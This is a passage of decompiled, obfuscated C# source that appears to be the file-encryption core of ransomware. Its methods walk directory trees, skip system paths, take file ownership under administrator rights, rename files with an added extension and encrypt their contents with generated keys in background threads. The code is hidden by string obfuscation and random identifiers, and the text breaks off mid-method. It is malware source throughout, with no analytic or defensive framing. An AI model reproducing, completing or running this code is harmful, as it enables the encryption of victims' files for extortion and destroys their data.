using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using wVRaLppLPGmaSaj;
using zCZInypFvszt;

namespace DFgOqDzZpZe;

internal sealed class thNrRmMEuvdxhHm
{
	public sealed class pxHSVPxzzLpnQ
	{
		private static StringCollection OesKmucXEcJp;

		private static List<string> wqBdyzDLJibeCock;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107402976));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107402971)) && !text.ToLower().Contains(getString_0(107402982)) && !text.ToLower().Contains(getString_0(107389516)) && !text.ToLower().Contains(getString_0(107389471)) && !text.ToLower().Contains(getString_0(107402937)) && !text.ToLower().Contains(getString_0(107389355)) && !text.ToLower().Contains(getString_0(107388784)) && !text.ToLower().Contains(getString_0(107388735)) && !text.ToLower().Contains(getString_0(107388750)) && !text.ToLower().Contains(getString_0(107388701)) && !text.ToLower().Contains(getString_0(107388667)) && !text.ToLower().Contains(getString_0(107388682)) && !text.ToLower().Contains(getString_0(107388633)) && !text.ToLower().Contains(getString_0(107388652)) && !text.ToLower().Contains(getString_0(107388599)) && !text.ToLower().Contains(getString_0(107388618)) && !text.ToLower().Contains(getString_0(107388573)) && !text.ToLower().Contains(getString_0(107388588)) && !text.ToLower().Contains(getString_0(107388539)) && !text.Contains(ZvzUuZdcuZvZyuA(getString_0(107388554))) && !text.Contains(getString_0(107389041)) && !text.Contains(getString_0(107389028)) && !text.EndsWith(getString_0(107395586)) && !text.EndsWith(getString_0(107389003)) && !text.EndsWith(getString_0(107388998)) && !text.EndsWith(getString_0(107388961)) && !text.EndsWith(getString_0(107388956)) && !text.ToLower().Contains(getString_0(107388951)) && !text.ToLower().Contains(hdtcmoyGEV))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(rMzUuGRFsemZwV) * 1024.0 * 1024.0 && SUzteLfaPqYT == getString_0(107396819))
							{
								wqBdyzDLJibeCock.Add(text);
							}
							else if (File.Exists(text) && SUzteLfaPqYT == getString_0(107396385))
							{
								wqBdyzDLJibeCock.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return wqBdyzDLJibeCock;
		}

		static pxHSVPxzzLpnQ()
		{
			Strings.CreateGetStringDelegate(typeof(pxHSVPxzzLpnQ));
			OesKmucXEcJp = new StringCollection();
			wqBdyzDLJibeCock = new List<string>();
		}
	}

	private sealed class OmpDEIrizJ
	{
		public string ZYwGptWlIh;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == ZYwGptWlIh;
		}
	}

	private sealed class YMOBZpyLGbSHkV
	{
		public string pvghbFRCdmIVk;

		public bool _003CIsDriveNTFS_003Eb__17(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == pvghbFRCdmIVk;
		}
	}

	private sealed class bQMuOMVNLi
	{
		private sealed class mBxiTffIXXN
		{
			public bQMuOMVNLi ByFbriXeLG;

			public string hPVYSKCLhZQex;

			public void _003CCrypt_003Eb__21()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					NEtTtiYUXuvT(WindowsIdentity.GetCurrent().Name, hPVYSKCLhZQex);
				}
			}

			public void _003CCrypt_003Eb__22()
			{
				MnPibeJKWWmlF(hPVYSKCLhZQex, ByFbriXeLG.COqpewCWUx, ByFbriXeLG.TcWQUPeqHrK, ByFbriXeLG.rmmGSKNeUJBK, ByFbriXeLG.FzKQijQPMSBxG);
			}
		}

		public string[] COqpewCWUx;

		public string[] rmmGSKNeUJBK;

		public string FzKQijQPMSBxG;

		public string TcWQUPeqHrK;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__20(string string_0)
		{
			mBxiTffIXXN CS_0024_003C_003E8__locals0 = new mBxiTffIXXN();
			CS_0024_003C_003E8__locals0.ByFbriXeLG = this;
			CS_0024_003C_003E8__locals0.hPVYSKCLhZQex = string_0;
			if (YMNrvxnhNxvEzz && !ykfhcMmkJbZl().Contains(getString_0(107386669)) && !ykfhcMmkJbZl().Contains(getString_0(107386533)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						NEtTtiYUXuvT(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.hPVYSKCLhZQex);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (AaFKnZpVmxll == getString_0(107396826))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					MnPibeJKWWmlF(CS_0024_003C_003E8__locals0.hPVYSKCLhZQex, CS_0024_003C_003E8__locals0.ByFbriXeLG.COqpewCWUx, CS_0024_003C_003E8__locals0.ByFbriXeLG.TcWQUPeqHrK, CS_0024_003C_003E8__locals0.ByFbriXeLG.rmmGSKNeUJBK, CS_0024_003C_003E8__locals0.ByFbriXeLG.FzKQijQPMSBxG);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				MnPibeJKWWmlF(CS_0024_003C_003E8__locals0.hPVYSKCLhZQex, COqpewCWUx, TcWQUPeqHrK, rmmGSKNeUJBK, FzKQijQPMSBxG);
			}
		}

		static bQMuOMVNLi()
		{
			Strings.CreateGetStringDelegate(typeof(bQMuOMVNLi));
		}
	}

	private sealed class NxpTIMrohu
	{
		private sealed class DPkNfhpVfmzs
		{
			public NxpTIMrohu KkLhvrADszGGi;

			public string DVZJRBcuvHJNv;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				try
				{
					if (hdAepnrmnch)
					{
						Console.WriteLine(getString_0(107402484) + DVZJRBcuvHJNv + getString_0(107402893) + new FileInfo(DVZJRBcuvHJNv).Length + getString_0(107402904));
						Console.WriteLine(getString_0(107402491), bTWTPdqAFFpauU.Count, ZxYqzVUoLKX, bBKKzTBaLJVhdj);
						Console.WriteLine(getString_0(107402434), iprsjxEHICCj.Elapsed);
						Console.WriteLine(getString_0(107403375));
					}
				}
				catch
				{
				}
			}

			static DPkNfhpVfmzs()
			{
				Strings.CreateGetStringDelegate(typeof(DPkNfhpVfmzs));
			}
		}

		private sealed class RSTKtTJHsROT
		{
			public DPkNfhpVfmzs LmjDJUAApMbEj;

			public NxpTIMrohu KkLhvrADszGGi;

			public string JpKUkieOmB;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in SkvTXsJINBztMRD)
				{
					if (JpKUkieOmB.ToLower().EndsWith(item + KkLhvrADszGGi.ultCKTLdBIeqJ) && eiZgJNzJZhH == getString_0(107396841))
					{
						if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > new FileInfo(JpKUkieOmB).Length)
						{
							try
							{
								PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389726), getString_0(107389721), getString_0(107389676), JpKUkieOmB);
							}
							catch
							{
							}
						}
					}
					else if (JpKUkieOmB.ToLower().EndsWith(item) && eiZgJNzJZhH == getString_0(107396407))
					{
						try
						{
							PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389726), getString_0(107389721), getString_0(107389676), JpKUkieOmB);
						}
						catch
						{
						}
					}
				}
			}

			static RSTKtTJHsROT()
			{
				Strings.CreateGetStringDelegate(typeof(RSTKtTJHsROT));
			}
		}

		private sealed class wIiqciEKsSgyz
		{
			public NxpTIMrohu KkLhvrADszGGi;

			public string DVZJRBcuvHJNv;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				try
				{
					if (hdAepnrmnch)
					{
						Console.WriteLine(getString_0(107402491) + DVZJRBcuvHJNv + getString_0(107402900) + new FileInfo(DVZJRBcuvHJNv).Length + getString_0(107402911));
						Console.WriteLine(getString_0(107402498), bTWTPdqAFFpauU.Count, ZxYqzVUoLKX, bBKKzTBaLJVhdj);
						Console.WriteLine(getString_0(107402441), iprsjxEHICCj.Elapsed);
						Console.WriteLine(getString_0(107403382));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__34()
			{
				foreach (string item in SkvTXsJINBztMRD)
				{
					if (DVZJRBcuvHJNv.ToLower().EndsWith(item + KkLhvrADszGGi.ultCKTLdBIeqJ) && eiZgJNzJZhH == getString_0(107396844))
					{
						if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > new FileInfo(DVZJRBcuvHJNv).Length)
						{
							try
							{
								PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389729), getString_0(107389724), getString_0(107389679), DVZJRBcuvHJNv);
							}
							catch
							{
							}
						}
					}
					else if (DVZJRBcuvHJNv.ToLower().EndsWith(item) && eiZgJNzJZhH == getString_0(107396410))
					{
						try
						{
							PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389729), getString_0(107389724), getString_0(107389679), DVZJRBcuvHJNv);
						}
						catch
						{
						}
					}
				}
			}

			static wIiqciEKsSgyz()
			{
				Strings.CreateGetStringDelegate(typeof(wIiqciEKsSgyz));
			}
		}

		public List<string> FaezQiFiBmg;

		public List<string> RXnxbMGGkHM;

		public string ultCKTLdBIeqJ;

		public string[] omzlEvaIgXI;

		public string MmaHtQgyFtb;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2f(string string_0)
		{
			using List<string>.Enumerator enumerator = RXnxbMGGkHM.GetEnumerator();
			RSTKtTJHsROT CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				DPkNfhpVfmzs CS_0024_003C_003E8__locals1 = new DPkNfhpVfmzs();
				CS_0024_003C_003E8__locals1.KkLhvrADszGGi = this;
				CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv = enumerator.Current;
				if (CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107389062)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107389549)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107389516)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389531)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389486)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107389493)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107389472)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389459)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389414)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389409)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389400)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389351)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389325)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389336)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388799)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388750)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388765)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388716)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388731)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388682)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388697)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388648)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388667)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388614)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107388633)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107388588)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107388603)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107388554)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(ZvzUuZdcuZvZyuA(getString_0(107388569))) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107389056)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107397084)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107389043)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(ultCKTLdBIeqJ) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(getString_0(107389018)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(getString_0(107389013)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(getString_0(107388976)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(getString_0(107388971)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(getString_0(107388966)) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(hdtcmoyGEV) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(knClGxGTQzcKgW) || CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.Contains(WkbYpntLeHaVcf))
				{
					continue;
				}
				if (omzlEvaIgXI.Length != 0)
				{
					string[] array = omzlEvaIgXI;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1119;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(ultCKTLdBIeqJ))
					{
						goto IL_1119;
					}
				}
				catch (Exception)
				{
					goto IL_1119;
				}
				if (!CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv.EndsWith(string_0) || bTWTPdqAFFpauU.Contains(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv))
				{
					continue;
				}
				if (JvLbPnAiNtPFl == getString_0(107396834))
				{
					try
					{
						if (xNneCkeMZRvxQg.rdTUqItxjMreSCf(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv))
						{
							xNneCkeMZRvxQg.IliDSuvIRJoA(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
						}
					}
					catch
					{
					}
				}
				bTWTPdqAFFpauU.Add(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (hdAepnrmnch)
						{
							Console.WriteLine(DPkNfhpVfmzs.getString_0(107402484) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + DPkNfhpVfmzs.getString_0(107402893) + new FileInfo(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv).Length + DPkNfhpVfmzs.getString_0(107402904));
							Console.WriteLine(DPkNfhpVfmzs.getString_0(107402491), bTWTPdqAFFpauU.Count, ZxYqzVUoLKX, bBKKzTBaLJVhdj);
							Console.WriteLine(DPkNfhpVfmzs.getString_0(107402434), iprsjxEHICCj.Elapsed);
							Console.WriteLine(DPkNfhpVfmzs.getString_0(107403375));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!cVxpfEOwEmPC.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv)))
				{
					cVxpfEOwEmPC.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv));
				}
				DnuJfeBIbLhr(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
				try
				{
					new NTQxrgSdsWceAc().mAZxWbHOwVEf(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (hdAepnrmnch)
							{
								Console.WriteLine(getString_0(107402967) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107402890) + new FileInfo(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv).Length + getString_0(107402901));
								Console.WriteLine(getString_0(107403372));
							}
						}
						catch
						{
						}
						mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107403267)), getString_0(107388914) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107388914) + ZvzUuZdcuZvZyuA(getString_0(107403242)) + getString_0(107388914) + Environment.UserName + getString_0(107388914) + ZvzUuZdcuZvZyuA(getString_0(107403257)));
					}
				}
				catch (Exception ex2)
				{
					if (MvyzXvhzMsIEWT)
					{
						try
						{
							File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107403232) + ex2.Message + getString_0(107395942));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (MvyzXvhzMsIEWT)
						{
							try
							{
								File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107402607) + ex4.Message + getString_0(107395942));
							}
							catch (Exception)
							{
							}
						}
						bBKKzTBaLJVhdj++;
						goto end_IL_08ba;
					}
					if (AjDKbvSruxge == getString_0(107396834) && new FileInfo(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv).Length > Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024 && !FaezQiFiBmg.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new RSTKtTJHsROT();
						CS_0024_003C_003E8__locals0.LmjDJUAApMbEj = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.KkLhvrADszGGi = this;
						try
						{
							if (ultCKTLdBIeqJ != getString_0(107386551))
							{
								if (mYYMBtfmlAOyF)
								{
									ultCKTLdBIeqJ = zmgIWyNctPwjW + ultCKTLdBIeqJ;
								}
								File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ);
							}
						}
						catch (Exception ex6)
						{
							if (MvyzXvhzMsIEWT)
							{
								try
								{
									File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107402578) + ex6.Message + getString_0(107395942));
								}
								catch (Exception)
								{
								}
							}
							bBKKzTBaLJVhdj++;
							goto end_IL_08ba;
						}
						CS_0024_003C_003E8__locals0.JpKUkieOmB = getString_0(107389606);
						if (ultCKTLdBIeqJ != getString_0(107386551))
						{
							CS_0024_003C_003E8__locals0.JpKUkieOmB = CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ;
						}
						else
						{
							CS_0024_003C_003E8__locals0.JpKUkieOmB = CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv;
						}
						if (FGSbbxnupor == getString_0(107396834))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in SkvTXsJINBztMRD)
								{
									if (CS_0024_003C_003E8__locals0.JpKUkieOmB.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.KkLhvrADszGGi.ultCKTLdBIeqJ) && eiZgJNzJZhH == RSTKtTJHsROT.getString_0(107396841))
									{
										if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JpKUkieOmB).Length)
										{
											try
											{
												PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(RSTKtTJHsROT.getString_0(107389726), RSTKtTJHsROT.getString_0(107389721), RSTKtTJHsROT.getString_0(107389676), CS_0024_003C_003E8__locals0.JpKUkieOmB);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.JpKUkieOmB.ToLower().EndsWith(item) && eiZgJNzJZhH == RSTKtTJHsROT.getString_0(107396407))
									{
										try
										{
											PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(RSTKtTJHsROT.getString_0(107389726), RSTKtTJHsROT.getString_0(107389721), RSTKtTJHsROT.getString_0(107389676), CS_0024_003C_003E8__locals0.JpKUkieOmB);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						string text = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
						string text2 = getString_0(107389606);
						text2 = (dludHStvHyTu ? COHaNSLBjuDxHFZgW.POLqBalRuwH() : getString_0(107389606));
						string s = wAtanfYbhauOuKP.MvqOeoNjtEKI(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (IiqKblfhNFuY == getString_0(107396400))
						{
							byte[] array2 = null;
							byte[] byte_ = hLhUwUDAhWMjzuB.DfGjgEHjZJUE(CS_0024_003C_003E8__locals0.JpKUkieOmB, Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024);
							if (hLhUwUDAhWMjzuB.LDXgNdvfAheSqfs(yTrxIKISCfGp: (!CcJcTYoshtYbPYb) ? (dludHStvHyTu ? hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_, Convert.FromBase64String(MmaHtQgyFtb), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dludHStvHyTu ? DlKGxPgDEDy.AxAOLtoppUjMDv(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : DlKGxPgDEDy.AxAOLtoppUjMDv(byte_, Convert.FromBase64String(MmaHtQgyFtb), Convert.FromBase64String(zSiinLyeiNOaQic))), KyClZYkMZEgn: CS_0024_003C_003E8__locals0.JpKUkieOmB, xPcAnAVJYVtBl: bytes))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
							}
							catch (Exception)
							{
							}
						}
						else if (!dludHStvHyTu)
						{
							if (UBFsZsHuzIVCuyiH.HAYNDKhQUXPc(CS_0024_003C_003E8__locals0.JpKUkieOmB, vmbpzaFVaVU, MmaHtQgyFtb, null, Convert.FromBase64String(zSiinLyeiNOaQic)))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (UBFsZsHuzIVCuyiH.HAYNDKhQUXPc(CS_0024_003C_003E8__locals0.JpKUkieOmB, vmbpzaFVaVU, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (mYYMBtfmlAOyF)
					{
						ultCKTLdBIeqJ = zmgIWyNctPwjW + ultCKTLdBIeqJ;
					}
					string text3 = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
					string text4 = getString_0(107389606);
					text4 = (dludHStvHyTu ? COHaNSLBjuDxHFZgW.POLqBalRuwH() : getString_0(107389606));
					string s2 = wAtanfYbhauOuKP.MvqOeoNjtEKI(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (ultCKTLdBIeqJ != getString_0(107386551))
					{
						if (!kIbCIqqAMtB)
						{
							if (!dludHStvHyTu)
							{
								FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, INlpeyNXGAcMRYsht);
							}
							else
							{
								FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!dludHStvHyTu)
								{
									EPFgKsSOzMWL(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, INlpeyNXGAcMRYsht, Convert.FromBase64String(zSiinLyeiNOaQic));
								}
								else
								{
									EPFgKsSOzMWL(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (MvyzXvhzMsIEWT)
								{
									try
									{
										File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107386505) + ex11.Message + getString_0(107395942));
									}
									catch (Exception)
									{
									}
								}
								bBKKzTBaLJVhdj++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
								}
								catch (Exception)
								{
								}
								goto end_IL_08ba;
							}
						}
					}
					else if (!kIbCIqqAMtB)
					{
						if (!dludHStvHyTu)
						{
							FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107386546), INlpeyNXGAcMRYsht);
						}
						else
						{
							FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107386546), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!dludHStvHyTu)
							{
								EPFgKsSOzMWL(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, INlpeyNXGAcMRYsht, Convert.FromBase64String(zSiinLyeiNOaQic));
							}
							else
							{
								EPFgKsSOzMWL(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (MvyzXvhzMsIEWT)
							{
								try
								{
									File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + getString_0(107386505) + ex14.Message + getString_0(107395942));
								}
								catch (Exception)
								{
								}
							}
							bBKKzTBaLJVhdj++;
							goto end_IL_08ba;
						}
					}
					if (dludHStvHyTu)
					{
						if (ultCKTLdBIeqJ != getString_0(107386551))
						{
							sgeKhRYEDh(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv + ultCKTLdBIeqJ, bytes2);
						}
						else
						{
							sgeKhRYEDh(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv, bytes2);
						}
					}
					goto IL_1119;
					end_IL_08ba:;
				}
				catch (Exception)
				{
					goto IL_1119;
				}
				continue;
				IL_1119:
				RXnxbMGGkHM.Remove(CS_0024_003C_003E8__locals1.DVZJRBcuvHJNv);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			wIiqciEKsSgyz CS_0024_003C_003E8__locals0 = new wIiqciEKsSgyz();
			CS_0024_003C_003E8__locals0.KkLhvrADszGGi = this;
			CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv = string_0;
